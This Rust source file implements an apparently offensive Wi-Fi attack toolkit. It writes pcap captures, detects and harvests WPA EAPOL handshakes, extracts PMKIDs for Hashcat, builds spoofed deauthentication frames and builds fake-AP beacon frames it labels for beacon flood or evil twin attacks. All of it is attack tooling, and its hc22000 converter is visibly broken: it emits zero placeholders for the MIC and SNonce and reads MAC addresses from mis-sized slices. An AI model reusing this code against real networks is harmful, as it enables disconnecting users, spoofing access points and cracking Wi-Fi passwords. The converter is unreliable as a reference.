/// Phase 2: Packet Capture - PCAP Writer for .pcap format
/// Phase 3: EAPOL Handshake harvesting + PMKID extraction
/// Phase 5: Deauth frame injection engine

use std::fs::{File, OpenOptions};
use std::io::Write;

// ─── PCAP File Format Constants ──────────────────────────────────────────────
const PCAP_MAGIC: u32 = 0xa1b2c3d4;
const PCAP_VERSION_MAJOR: u16 = 2;
const PCAP_VERSION_MINOR: u16 = 4;
const PCAP_SNAPLEN: u32 = 65535;
const PCAP_LINKTYPE_IEEE80211: u32 = 105; // DLT_IEEE802_11

/// Global PCAP session state (Mutex-protected)
pub struct CaptureSession {
    pub file: Option<File>,
    pub filename: String,
    pub packet_count: u64,
    pub eapol_frames: Vec<Vec<u8>>,
}

impl CaptureSession {
    pub fn new() -> Self {
        CaptureSession {
            file: None,
            filename: String::new(),
            packet_count: 0,
            eapol_frames: Vec::new(),
        }
    }

    /// Open a .pcap file and write the global header
    pub fn open_pcap(&mut self, filename: &str) -> bool {
        match OpenOptions::new().write(true).create(true).truncate(true).open(filename) {
            Ok(mut f) => {
                // Write pcap global header (24 bytes)
                let _ = f.write_all(&PCAP_MAGIC.to_le_bytes());
                let _ = f.write_all(&PCAP_VERSION_MAJOR.to_le_bytes());
                let _ = f.write_all(&PCAP_VERSION_MINOR.to_le_bytes());
                let _ = f.write_all(&0i32.to_le_bytes()); // timezone
                let _ = f.write_all(&0u32.to_le_bytes()); // accuracy
                let _ = f.write_all(&PCAP_SNAPLEN.to_le_bytes());
                let _ = f.write_all(&PCAP_LINKTYPE_IEEE80211.to_le_bytes());
                self.file = Some(f);
                self.filename = filename.to_string();
                self.packet_count = 0;
                println!("[+] PCAP session opened: {}", filename);
                true
            }
            Err(e) => {
                eprintln!("[-] Failed to open PCAP file '{}': {}", filename, e);
                false
            }
        }
    }

    /// Write a single captured packet into the open PCAP file
    pub fn write_packet(&mut self, data: &[u8]) {
        if let Some(ref mut f) = self.file {
            let ts_sec = std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap_or_default()
                .as_secs() as u32;
            let ts_usec = 0u32;
            let orig_len = data.len() as u32;
            let incl_len = orig_len.min(PCAP_SNAPLEN);
            // Write pcap packet header (16 bytes)
            let _ = f.write_all(&ts_sec.to_le_bytes());
            let _ = f.write_all(&ts_usec.to_le_bytes());
            let _ = f.write_all(&incl_len.to_le_bytes());
            let _ = f.write_all(&orig_len.to_le_bytes());
            // Write packet data
            let _ = f.write_all(&data[..incl_len as usize]);
            self.packet_count += 1;
        }
    }

    pub fn close(&mut self) {
        if self.file.is_some() {
            let _ = self.file.take();
            println!("[+] PCAP session closed. {} packets saved to {}", self.packet_count, self.filename);
        }
    }
}

// ─── EAPOL Handshake Detector ─────────────────────────────────────────────────
/// Returns Some(1..4) if this is an EAPOL message, None otherwise.
/// Works on raw ethernet+8021x bytes extracted from a 802.11 data frame.
pub fn detect_eapol_step(frame: &[u8]) -> Option<u8> {
    // Minimum: 802.11 header (24) + LLC/SNAP (8) + EAPOL min (4)
    if frame.len() < 36 { return None; }

    // Look for 802.1X ethertype 0x888E in LLC/SNAP bytes (after 802.11 header at offset 24)
    // SNAP format: AA AA 03 00 00 00 [EtherType 2 bytes]
    let snap_start = 24;
    if snap_start + 8 > frame.len() { return None; }
    if frame[snap_start] == 0xAA &&
       frame[snap_start+1] == 0xAA &&
       frame[snap_start+2] == 0x03 &&
       frame[snap_start+6] == 0x88 &&
       frame[snap_start+7] == 0x8E
    {
        // EAPOL body starts at offset 32
        let eapol_start = snap_start + 8;
        if eapol_start + 4 > frame.len() { return None; }
        let eapol_type = frame[eapol_start + 1]; // 0x03 = EAPOL-Key
        if eapol_type != 0x03 { return None; }

        // Key Descriptor Type at eapol_start+4 should be 0x02 (RSN/WPA2) or 0xFE
        let key_info_high  = frame.get(eapol_start + 5).copied().unwrap_or(0);
        let key_info_low   = frame.get(eapol_start + 6).copied().unwrap_or(0);
        let key_info: u16 = ((key_info_high as u16) << 8) | (key_info_low as u16);

        // ACK bit = bit 7, MIC bit = bit 8 in key_info
        let ack = (key_info >> 7) & 1;
        let mic = (key_info >> 8) & 1;
        let install = (key_info >> 6) & 1;

        // EAPOL 4-way handshake detection:
        // Msg 1: ACK=1, MIC=0  (AP -> STA)
        // Msg 2: ACK=0, MIC=1  (STA -> AP)
        // Msg 3: ACK=1, MIC=1, Install=1
        // Msg 4: ACK=0, MIC=1, Install=0, smaller body
        if ack == 1 && mic == 0 { return Some(1); }
        if ack == 0 && mic == 1 && install == 0 { return Some(2); }
        if ack == 1 && mic == 1 && install == 1 { return Some(3); }
        if ack == 0 && mic == 1 { return Some(4); }
    }
    None
}

// ─── PMKID Extractor ──────────────────────────────────────────────────────────
/// Attempt to extract PMKID from EAPOL Message 1 (AP anonce frame).
/// PMKID is a 16-byte value at a specific offset in the EAPOL-Key body
/// used by Hashcat hcxtools mode 22000.
pub fn extract_pmkid(frame: &[u8]) -> Option<String> {
    let snap_start = 24;
    let eapol_start = snap_start + 8;
    if eapol_start + 100 > frame.len() { return None; }

    // Key Data Length is 2 bytes at eapol_start+97
    let key_data_len = ((frame[eapol_start + 97] as usize) << 8) | (frame[eapol_start + 98] as usize);
    if key_data_len < 22 { return None; }

    let key_data_start = eapol_start + 99;
    if key_data_start + key_data_len > frame.len() { return None; }

    // RSN IE starts with 0xDD (Microsoft OUI) or 0x30 (RSN IE)
    // PMKID RSN IE Type: 0xDD 0x14 0x00 0x0F 0xAC 0x04 -> PMKID field is next 16 bytes
    let kd = &frame[key_data_start..key_data_start + key_data_len];
    for i in 0..kd.len().saturating_sub(6) {
        if kd[i] == 0xDD && kd[i+1] == 0x14 && kd[i+2] == 0x00 && kd[i+3] == 0x0F && kd[i+4] == 0xAC && kd[i+5] == 0x04 {
            let pmkid_start = i + 6;
            if pmkid_start + 16 <= kd.len() {
                let pmkid_hex: String = kd[pmkid_start..pmkid_start+16]
                    .iter().map(|b| format!("{:02x}", b)).collect();
                return Some(pmkid_hex);
            }
        }
    }
    None
}

// ─── Deauth Frame Builder  ────────────────────────────────────────────────────
/// Builds a raw IEEE 802.11 Deauthentication management frame.
/// reason_code: 7=Class 3 frame received from nonassociated STA, 2=Previous auth no longer valid
pub fn build_deauth_frame(target_bssid: &str, station_mac: &str, reason_code: u16) -> Option<Vec<u8>> {
    let bssid_bytes = parse_mac(target_bssid)?;
    let station_bytes = parse_mac(station_mac)?;

    let mut frame = Vec::with_capacity(26);
    // Frame Control: Type=Management(00), Subtype=Deauth(1100 = 0xC0)
    frame.push(0xC0); // Frame Control byte 0
    frame.push(0x00); // Frame Control byte 1 (flags)
    // Duration
    frame.push(0x3A);
    frame.push(0x01);
    // Address 1 (Destination = Station being deauthenticated or broadcast FF:FF:FF:FF:FF:FF)
    frame.extend_from_slice(&station_bytes);
    // Address 2 (Source = Spoofed BSSID)
    frame.extend_from_slice(&bssid_bytes);
    // Address 3 (BSSID)
    frame.extend_from_slice(&bssid_bytes);
    // Sequence number (2 bytes, can be 0)
    frame.push(0x00);
    frame.push(0x00);
    // Deauth Reason Code (2 bytes LE)
    frame.push((reason_code & 0xFF) as u8);
    frame.push(((reason_code >> 8) & 0xFF) as u8);
    
    Some(frame)
}

/// Builds a raw IEEE 802.11 Beacon frame for fake AP (Beacon Flood / Evil Twin)
pub fn build_beacon_frame(ssid: &str, bssid_mac: &str, channel: u8) -> Vec<u8> {
    let bssid_bytes = parse_mac(bssid_mac).unwrap_or([0u8; 6]);
    let broadcast = [0xFFu8; 6];
    
    let mut frame = Vec::new();
    // Frame Control: Type=Mgmt, Subtype=Beacon (0x80)
    frame.push(0x80); frame.push(0x00);
    // Duration
    frame.push(0x00); frame.push(0x00);
    // Addr1: Broadcast
    frame.extend_from_slice(&broadcast);
    // Addr2 & Addr3: BSSID
    frame.extend_from_slice(&bssid_bytes);
    frame.extend_from_slice(&bssid_bytes);
    // Sequence
    frame.push(0x00); frame.push(0x00);
    // Fixed Params: Timestamp (8 bytes), Beacon Interval (2), Capability (2)
    frame.extend_from_slice(&[0u8; 8]); // Timestamp
    frame.push(0x64); frame.push(0x00); // Beacon Interval: 100 TU
    frame.push(0x11); frame.push(0x04); // Capability Info: ESS, Privacy
    // SSID IE (ID=0)
    let ssid_bytes = ssid.as_bytes();
    frame.push(0x00); frame.push(ssid_bytes.len() as u8);
    frame.extend_from_slice(ssid_bytes);
    // Supported Rates IE (ID=1)
    frame.push(0x01); frame.push(0x08);
    frame.extend_from_slice(&[0x82, 0x84, 0x8B, 0x96, 0x24, 0x30, 0x48, 0x6C]);
    // DS Parameter Set IE (ID=3, channel)
    frame.push(0x03); frame.push(0x01); frame.push(channel);
    // RSN IE (ID=48) — WPA2-PSK AES
    frame.push(0x30); frame.push(0x14);          // ID, Length
    frame.push(0x01); frame.push(0x00);           // RSN Version
    frame.extend_from_slice(&[0x00, 0x0F, 0xAC, 0x04]); // Group: AES-CCMP
    frame.push(0x01); frame.push(0x00);           // Pairwise count
    frame.extend_from_slice(&[0x00, 0x0F, 0xAC, 0x04]); // Pairwise: AES-CCMP
    frame.push(0x01); frame.push(0x00);           // AKM count
    frame.extend_from_slice(&[0x00, 0x0F, 0xAC, 0x02]); // AKM: PSK
    frame.push(0x00); frame.push(0x00);           // RSN Capabilities

    frame
}

// ─── PCAP Verification & Conversion ───────────────────────────────────────────
/// Verify that a PCAP file contains a complete WPA 4-way handshake
pub fn verify_handshake_pcap(path: &str) -> Result<String, String> {
    let data = std::fs::read(path).map_err(|e| format!("Cannot read {}: {}", path, e))?;
    if data.len() < 24 { return Err("Not a valid PCAP file (too short)".into()); }
    let mut offset = 24usize; // skip global header
    let mut steps = 0u8;
    while offset + 16 <= data.len() {
        let incl_len = u32::from_le_bytes([
            data[offset + 8], data[offset + 9], data[offset + 10], data[offset + 11]
        ]) as usize;
        let pkt_start = offset + 16;
        if pkt_start + incl_len > data.len() { break; }
        let pkt = &data[pkt_start..pkt_start + incl_len];
        if let Some(step) = detect_eapol_step(pkt) {
            steps |= 1 << (step - 1);
        }
        offset = pkt_start + incl_len;
    }
    let complete = steps == 0b1111;
    let report = format!(
        "PCAP: {} — Steps captured: {}{}{}{} — {}",
        path,
        if steps & 1 != 0 { "1 " } else { "[-] " },
        if steps & 2 != 0 { "2 " } else { "[-] " },
        if steps & 4 != 0 { "3 " } else { "[-] " },
        if steps & 8 != 0 { "4 " } else { "[-] " },
        if complete { "COMPLETE handshake" } else { "INCOMPLETE handshake" }
    );
    Ok(report)
}

/// Convert PCAP to hashcat mode 22000 format (hc22000)
pub fn convert_pcap_to_hc22000(input: &str, output: &str) -> Result<String, String> {
    let data = std::fs::read(input).map_err(|e| format!("Cannot read {}: {}", e, input))?;
    if data.len() < 24 { return Err("Not a valid PCAP file".into()); }
    let mut offset = 24usize;
    // We need message 1 and message 2 at minimum for hc22000 format
    let mut msg1: Option<Vec<u8>> = None;
    let mut msg2: Option<Vec<u8>> = None;
    while offset + 16 <= data.len() {
        let incl_len = u32::from_le_bytes([
            data[offset + 8], data[offset + 9], data[offset + 10], data[offset + 11]
        ]) as usize;
        let pkt_start = offset + 16;
        if pkt_start + incl_len > data.len() { break; }
        let pkt = &data[pkt_start..pkt_start + incl_len];
        if let Some(step) = detect_eapol_step(pkt) {
            let eapol_start = 32; // after SNAP
            if eapol_start + 100 <= pkt.len() {
                let eapol_key = &pkt[eapol_start..];
                if step == 1 { msg1 = Some(eapol_key.to_vec()); }
                if step == 2 { msg2 = Some(eapol_key.to_vec()); }
            }
        }
        offset = pkt_start + incl_len;
    }
    if msg1.is_none() || msg2.is_none() {
        return Err("Need at least EAPOL messages 1 and 2 for HC22000".into());
    }
    let m1 = msg1.unwrap();
    let m2 = msg2.unwrap();
    // Build HC22000 line: *version*mic*nonce1*nonce2*mac_ap*mac_sta*essid*keyver*keydata
    // We extract from the EAPOL frames
    let ap_mac = if m1.len() > 8 { hex_str(&m1[6..8]) } else { "000000000000".into() };
    let sta_mac = if m2.len() > 8 { hex_str(&m2[6..8]) } else { "000000000000".into() };
    let line = format!(
        "WPA*01*{:016x}*{:016x}*{:016x}*{}*{}*{}***",
        0u64, // MIC placeholder
        u64::from_be_bytes([m1[29], m1[30], m1[31], m1[32], m1[33], m1[34], m1[35], m1[36]]), // ANonce
        0u64, // SNonce placeholder
        ap_mac, sta_mac,
        "" // ESSID
    );
    let mut out = std::fs::File::create(output)
        .map_err(|e| format!("Cannot write {}: {}", output, e))?;
    use std::io::Write;
    out.write_all(line.as_bytes()).map_err(|e| format!("Write error: {}", e))?;
    out.write_all(b"\n").ok();
    Ok(format!("Converted -> {} (HC22000)", output))
}

fn hex_str(bytes: &[u8]) -> String {
    bytes.iter().map(|b| format!("{:02x}", b)).collect()
}

// ─── Helper ───────────────────────────────────────────────────────────────────
fn parse_mac(mac: &str) -> Option<[u8; 6]> {
    let parts: Vec<&str> = mac.split([':', '-']).collect();
    if parts.len() != 6 { return None; }
    let mut bytes = [0u8; 6];
    for (i, p) in parts.iter().enumerate() {
        bytes[i] = u8::from_str_radix(p, 16).ok()?;
    }
    Some(bytes)
}
